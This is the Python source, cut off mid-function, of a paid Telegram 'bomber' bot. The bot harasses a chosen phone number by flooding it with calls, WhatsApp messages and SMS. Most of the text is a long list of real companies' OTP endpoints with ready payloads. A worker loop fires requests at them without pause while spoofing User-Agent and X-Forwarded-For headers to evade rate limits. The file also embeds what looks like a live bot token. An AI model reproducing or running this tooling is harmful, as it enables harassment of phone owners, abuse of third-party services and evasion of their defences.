import os
import sys
import time
import random
import sqlite3
import threading
import asyncio
import json
import re
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging

# ============ DISABLE LOGS ============
logging.basicConfig(level=logging.ERROR)

# ============ FIX: FORCE ASYNCIO ============
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8460733171:AAEAu78JX77pIFyWRNOsRVZl7eS1IxrDQbw")
OWNER_ID = int(os.environ.get("OWNER_ID", "8823804885"))
ADMIN_IDS = [8823804885, 8823804885]  # Add more admin IDs here
PORT = int(os.environ.get("PORT", 8080))
FREE_TOKENS = 100
TOKEN_PRICE = 50  # ₹50 per 100 tokens

print("🚀 SepaxYt Ultimate Bomber Starting...")
print(f"🤖 Token: {BOT_TOKEN[:10]}...")
print(f"👑 Owner: {OWNER_ID}")
print(f"🌐 Port: {PORT}")

# ============ DATABASE ============
class Database:
    def __init__(self):
        try:
            self.conn = sqlite3.connect('bomber.db', check_same_thread=False)
            self.cursor = self.conn.cursor()
            self.init_db()
            print("✅ Database connected")
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def init_db(self):
        # Users table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            tokens INTEGER DEFAULT 100,
            total_used INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            is_premium INTEGER DEFAULT 0
        )''')
        
        # Channels table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            channel_username TEXT UNIQUE,
            added_by INTEGER,
            date TEXT
        )''')
        
        # History table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            calls INTEGER DEFAULT 0,
            whatsapp INTEGER DEFAULT 0,
            sms INTEGER DEFAULT 0,
            hits INTEGER DEFAULT 0,
            date TEXT
        )''')
        
        # Redeem codes table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            tokens INTEGER,
            created_by INTEGER,
            used_by INTEGER DEFAULT NULL,
            used_date TEXT DEFAULT NULL,
            expiry_date TEXT,
            is_used INTEGER DEFAULT 0
        )''')
        
        # Targets table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            added_by INTEGER,
            date TEXT,
            status TEXT DEFAULT 'pending'
        )''')
        
        # Settings table
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        self.conn.commit()
        
        # Add default channel
        self.cursor.execute('INSERT OR IGNORE INTO channels (channel_username, added_by, date) VALUES (?, ?, ?)',
            ("@SepaxYtOfficial", OWNER_ID, datetime.now().isoformat()))
        self.conn.commit()
        print("✅ Database tables created")
    
    def get_user(self, user_id):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return self.cursor.fetchone()
    
    def add_user(self, user_id, username, first_name):
        self.cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
            (user_id, username or "Unknown", first_name or "User", datetime.now().isoformat()))
        self.conn.commit()
        # Check if admin
        if user_id in ADMIN_IDS or user_id == OWNER_ID:
            self.cursor.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (user_id,))
            self.conn.commit()
    
    def update_tokens(self, user_id, amount):
        self.cursor.execute('UPDATE users SET tokens = tokens + ? WHERE user_id = ?', (amount, user_id))
        self.conn.commit()
    
    def update_used(self, user_id):
        self.cursor.execute('UPDATE users SET total_used = total_used + 1 WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    def update_hits(self, user_id, hits):
        self.cursor.execute('UPDATE users SET total_hits = total_hits + ? WHERE user_id = ?', (hits, user_id))
        self.conn.commit()
    
    def add_history(self, user_id, phone, calls, whatsapp, sms, hits):
        self.cursor.execute('''INSERT INTO history (user_id, phone, calls, whatsapp, sms, hits, date) 
            VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (user_id, phone, calls, whatsapp, sms, hits, datetime.now().isoformat()))
        self.conn.commit()
    
    def get_channels(self):
        self.cursor.execute('SELECT channel_username FROM channels')
        return [row[0] for row in self.cursor.fetchall()]
    
    def add_channel(self, channel, added_by):
        try:
            self.cursor.execute('INSERT OR IGNORE INTO channels (channel_username, added_by, date) VALUES (?, ?, ?)',
                (channel, added_by, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except:
            return False
    
    def remove_channel(self, channel):
        self.cursor.execute('DELETE FROM channels WHERE channel_username = ?', (channel,))
        self.conn.commit()
    
    def generate_redeem(self, tokens, created_by):
        code = f"SEP{random.randint(10000, 99999)}{random.randint(10000, 99999)}"
        expiry = (datetime.now() + timedelta(days=30)).isoformat()
        self.cursor.execute('INSERT INTO redeem_codes (code, tokens, created_by, expiry_date) VALUES (?, ?, ?, ?)',
            (code, tokens, created_by, expiry))
        self.conn.commit()
        return code
    
    def redeem_code(self, code, user_id):
        self.cursor.execute('SELECT * FROM redeem_codes WHERE code = ? AND is_used = 0 AND expiry_date > ?', 
            (code, datetime.now().isoformat()))
        data = self.cursor.fetchone()
        if data:
            self.cursor.execute('UPDATE redeem_codes SET used_by = ?, used_date = ?, is_used = 1 WHERE code = ?',
                (user_id, datetime.now().isoformat(), code))
            self.update_tokens(user_id, data[1])
            self.conn.commit()
            return data[1]
        return None
    
    def add_target(self, phone, added_by):
        self.cursor.execute('INSERT INTO targets (phone, added_by, date) VALUES (?, ?, ?)',
            (phone, added_by, datetime.now().isoformat()))
        self.conn.commit()
    
    def get_targets(self):
        self.cursor.execute('SELECT phone FROM targets WHERE status = "pending"')
        return [row[0] for row in self.cursor.fetchall()]
    
    def get_all_users(self):
        self.cursor.execute('SELECT user_id, username, first_name, tokens, total_used, total_hits FROM users')
        return self.cursor.fetchall()
    
    def get_redeem_codes(self):
        self.cursor.execute('SELECT code, tokens, created_by, is_used, used_by FROM redeem_codes')
        return self.cursor.fetchall()
    
    def ban_user(self, user_id):
        self.cursor.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    def unban_user(self, user_id):
        self.cursor.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    def set_premium(self, user_id):
        self.cursor.execute('UPDATE users SET is_premium = 1 WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    def get_setting(self, key):
        self.cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
        result = self.cursor.fetchone()
        return result[0] if result else None
    
    def set_setting(self, key, value):
        self.cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
        self.conn.commit()

db = Database()

# ============ 900+ ULTIMATE APIS ============
ULTIMATE_APIS = [
    # CALL/VOICE APIS
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Voice", "url": "https://www.hdfcbank.com/api/auth/send-voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Voice", "url": "https://www.icicibank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "SBI Voice", "url": "https://www.onlinesbi.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Axis Voice", "url": "https://www.axisbank.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Kotak Voice", "url": "https://www.kotak.com/api/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    
    # WHATSAPP APIS
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    {"name": "MamaEarth WhatsApp", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","via":"whatsapp"}}'},
    {"name": "Cosmofeed WhatsApp", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","channel":"whatsapp"}}'},
    
    # SMS APIS
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama SMS", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab SMS", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil SMS", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "Dayco SMS", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart SMS", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "Lending Plate SMS", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "ShipRocket SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe SMS", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Univest SMS", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten SMS", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name": "CaratLane SMS", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
    {"name": "BikeFixup SMS", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy SMS", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel SMS", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPink SMS", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome SMS", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq SMS", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore SMS", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda p: f"mobile={p}"},
    {"name": "Otpless SMS", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble SMS", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital SMS", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare SMS", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint SMS", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo SMS", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds SMS", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall SMS", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri SMS", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed SMS", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash SMS", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv SMS", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat SMS", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games SMS", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123"}}'},
    {"name": "Spencer's SMS", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe SMS", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop SMS", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga SMS", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigCash SMS", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "Lifestyle SMS", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "WorkIndia SMS", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi SMS", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle SMS", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle SMS", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever SMS", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
    {"name": "HealthMug SMS", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar SMS", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily SMS", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors SMS", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix SMS", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "MyGov SMS", "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "TrulyMadly SMS", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "CodFirm SMS", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe SMS", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "More Retail SMS", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Country Delight SMS", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "AstroSage SMS", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "TooToo SMS", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
    {"name": "ConfirmTkt SMS", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf SMS", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Nuvama SMS", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket SMS", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")

# ============ PHONE DESTROYER ============
class PhoneDestroyer:
    def __init__(self):
        self.running = False
        self.current_phone = None
        self.current_user = None
        self.stats = {
            "calls": 0,
            "whatsapp": 0,
            "sms": 0,
            "hits": 0,
            "total": 0,
            "start_time": 0
        }
    
    async def bomb_worker(self, session, api, phone):
        while self.running:
            try:
                name = api["name"].lower()
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36"
                ])
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                if "call" in name or "voice" in name:
                    self.stats["calls"] += 1
                elif "whatsapp" in name:
                    self.stats["whatsapp"] += 1
                else:
                    self.stats["sms"] += 1
                
                if api["method"] == "POST":
